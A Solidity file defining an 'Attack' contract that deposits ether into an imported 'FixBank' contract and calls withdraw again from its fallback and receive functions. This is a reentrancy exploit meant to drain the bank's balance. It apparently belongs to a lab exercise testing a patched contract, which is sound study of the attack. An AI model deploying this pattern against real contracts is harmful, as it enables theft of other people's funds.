// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {FixBank} from "./Fixbank.sol";

contract Attack {
    FixBank public bank;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _bankaddress) {
        bank = FixBank(_bankaddress);
    }

    function _reenter() internal {
        if (address(bank).balance >= AMOUNT) {
            bank.withdraw(AMOUNT);
        }
    }

    fallback() external payable {
        _reenter();
    }

    receive() external payable {
        _reenter();
    }

    function attack() external payable {
        require(msg.value >= AMOUNT, "need >= 1 ether");

        bank.deposit{value: AMOUNT}();
        bank.withdraw(AMOUNT);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
